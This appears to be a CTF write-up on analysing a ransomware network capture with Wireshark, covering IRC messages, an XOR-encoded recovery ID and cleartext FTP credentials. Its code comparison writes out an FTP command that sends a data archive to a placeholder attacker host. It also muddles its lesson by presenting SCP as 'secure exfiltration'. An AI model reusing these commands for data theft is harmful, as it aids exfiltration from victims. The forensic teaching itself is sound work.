# CTF Write-up: Vault Breach

**Category:** Network Forensics
**Challenge Source:** tcraCyber champion 2026
**Write-up Author:** TitoDevsec (T1t0D3v$3c)

## Challenge Summary
The challenge involved analyzing a network capture (`PCAP`) of a ransomware attack. The goal was to identify attacker communications, extract a recovery ID, and recover exfiltrated credentials.

## Vulnerability Analysis
### What was wrong?
The attacker used unencrypted protocols for critical communications and data exfiltration. Specifically, **IRC** and **FTP** were used, allowing anyone with access to the network traffic to see the messages and credentials in cleartext.

## Solution
1.  **IRC Analysis:** Filter for `irc` in Wireshark. A conversation revealed that a ransomware note was found and the recovery ID was XOR-encoded.
2.  **Ransomware Note:** Search for the string "BLUE SKY" in the TCP payloads.
    ```wireshark
    tcp.payload contains "BLUE SKY"
    ```
3.  **Recovery ID Extraction:** Locate the "RECOVERY ID" in the TCP stream.
4.  **XOR Decoding:** Use CyberChef's "XOR Brute Force" on the extracted ID to reveal the flag.
5.  **FTP Analysis:** Filter for `tcp.port == 21` to find FTP traffic.
6.  **Credential Recovery:** Follow the TCP stream for the FTP session. Since FTP is plaintext, the credentials were visible:
    *   **USER:** `tadmin`
    *   **PASS:** `2025!09#`

## Code Comparison

### Vulnerable Practice
Using plaintext protocols for sensitive data:
```bash
# Attacker exfiltrating data via FTP
ftp -n $ATTACKER_IP <<EOF
quote USER tadmin
quote PASS 2025!09#
put sensitive_data.zip
quit
EOF
```

### Secure Practice
Always use encrypted protocols like **SFTP**, **SCP**, or **HTTPS** for data transfer and secure messaging platforms for communication.
```bash
# Secure exfiltration using SCP
scp sensitive_data.zip tadmin@$SECURE_SERVER:/path/to/destination
```

## Lessons Learned
*   **Protocol Security:** Plaintext protocols (HTTP, FTP, IRC, Telnet) are a major security risk as they expose data to sniffing.
*   **Traffic Analysis:** Wireshark is a powerful tool for reconstructing attacker workflows and extracting evidence from network captures.
*   **Defense in Depth:** Even if an attacker gains access to the network, encrypted communications provide a critical layer of defense.

## Flag
`tzcert{...}` (The flag was obtained by decoding the XORed Recovery ID).
